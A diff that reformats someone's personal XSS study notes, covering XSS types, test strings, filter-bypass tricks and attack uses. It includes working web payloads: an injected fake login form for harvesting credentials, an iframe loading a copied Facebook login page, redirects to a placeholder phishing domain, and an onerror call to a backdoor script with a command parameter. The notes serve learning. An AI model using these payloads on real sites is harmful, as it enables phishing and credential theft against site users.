@@ -1,32 +1,31 @@
 XSS Study notes:
 
-Reflected XSS:
+**Reflected XSS:**  
 Injecting mal script into a searchbox or at the end of the URL. Think of it like throwing a ball against a wall and it bouncing back.
 
-Stored XSS:
+**Stored XSS:**  
 This is when an injected script is stored in the website eg a guestbook or posting board. These hit everyone who reach the site.
 
-DOM: Document object model EG you put in user and pass, they get loaded into the dom and checked - the page itself never loads the code thus stopping traditional XSS
-DOM based (rare):
-
+**DOM:**  
+Document object model EG you put in user and pass, they get loaded into the dom and checked - the page itself never loads the code thus stopping traditional XSS
 
 AJAX = asynchronous JavaScript (they change their contents by manipulating areas within the document object model)
 
-Tests:
-<script>alert('1234');</script>
-<h1><font color="#00FF00">I like turtles</font></h1>
+**Tests:**
+`<script>alert('1234');</script>`  
+`<h1><font color="#00FF00">I like turtles</font></h1> ` 
 
-Bypasses:
-$ 1.) magic_quotes_gpc=ON bypass
-		Bypass this by converting your text to decimal characters and place them inside the java function: String.fromCharCode()
-			EG <script>alert('1234');</script> = <script>alert(string.fromcharcode(49, 50, 51, 52));</script>
-$ 2.) HEX encoding
-		you can encode your payload as HEX, I could not get this to work, however this apparently is a valid bypass
-$ 3.) Obfuscation
-		as a low level contrived example, some strings such as "script","alert()","''" as listed as bad words, so either sanitsed or
-		or handled with exceptions. Low level obfuscation can bypass: <sCrIpT>alert('turtles');</ScRiPt> (I KNOW IT'S LAME)
-$ 4.) "Trying around"
-		Basically means just that, string different methods together, interupt search box HTML tags with "> (this closes the tag) 
+**Bypasses:**  
+$ 1.) magic_quotes_gpc=ON bypass  
+		Bypass this by converting your text to decimal characters and place them inside the java function: `String.fromCharCode()`  
+			EG `<script>alert('1234');</script> = <script>alert(string.fromcharcode(49, 50, 51, 52));</script>`  
+$ 2.) HEX encoding  
+		you can encode your payload as HEX, I could not get this to work, however this apparently is a valid bypass  
+$ 3.) Obfuscation  
+		as a low level contrived example, some strings such as `"script","alert()","''"` as listed as bad words, so either sanitsed or
+		or handled with exceptions. Low level obfuscation can bypass: `<sCrIpT>alert('turtles');</ScRiPt>` (I KNOW IT'S LAME)  
+$ 4.) "Trying around"  
+		Basically means just that, string different methods together, interupt search box HTML tags with `">` (this closes the tag)   
 		
 Stuff we can do?
 
@@ -36,33 +35,31 @@ $ 3.) Redirict Phishing
 $ 4.) Cookie stealing
 
 
-$ 1.) Phishing script injection: Inject a 'user' and 'password' field in html
+$ 1.) Phishing script injection: Inject a 'user' and 'password' field in html  
 $     (With the <html> and <body> tags), creating a false login field where the creds are harvested.
 		<html><body><head><meta content="text/html; charset=utf-8"></meta></head><div style="text-align: center;">
-		Phishingpage :<br /><br/>Username :<br /> <input name="User" /><br />Password :<br /> 
+		Phishingpage :``<br /><br/>Username :<br /> <input name="User" /><br />Password :<br />``  
 		<input name="Password" type="password" /><br /><br /><input name="Valid" value="Ok !" type="submit" /><br /></form></div></body></html>
 
 $ 2.) Iframe Phishing: inject a javascript code containing an
 $     iframe where your phishing site is embeeded.
 $     Obviously it needs to look just like the target site.
 
-<iframe src="http://192.168.21.130/Facebook – log in or sign up.html" height="100%" width="100%"></iframe>
+`<iframe src="http://192.168.21.130/Facebook – log in or sign up.html" height="100%" width="100%"></iframe>`
 
-$ (Note: height="100%" width="100%" means that the whole window is filled with
-$ that iframe.)
-$ The target site will spawn your phishing site in an Iframe, and the website user / victims won't see a
-$ difference and log in (If they're are foolish enough).
+$ (Note: height="100%" width="100%" means that the whole window is filled with that iframe.)  
+$ The target site will spawn your phishing site in an Iframe, and the website user / victims won't see a difference and log in (If they're are foolish enough).  
 
  3.) Rediriction Phishing: Similar simple concept, inject a javascript rediriction
 $     script that leads to your phishingsite, make sure it looks the same.
 
 $ Example:
 
-  <script>document.location.href="http://www.yourphishingsite.ru"</script>
+  `<script>document.location.href="http://www.yourphishingsite.ru"</script>`
 
-  <META HTTP-EQUIV="refresh" CONTENT="0; URL="http://www.yorphishingsite.ru">
+  `<META HTTP-EQUIV="refresh" CONTENT="0; URL="http://www.yorphishingsite.ru">`
 
-  <img src=x onerror=this.src="http://10.10.10.154/admin/backdoorchecker.php?cmd=dirheck>
+  `<img src=x onerror=this.src="http://10.10.10.154/admin/backdoorchecker.php?cmd=dirheck>`
 
 4.) Cookie stealing: A feared XSS flaw.
 Can be reflected or stored.
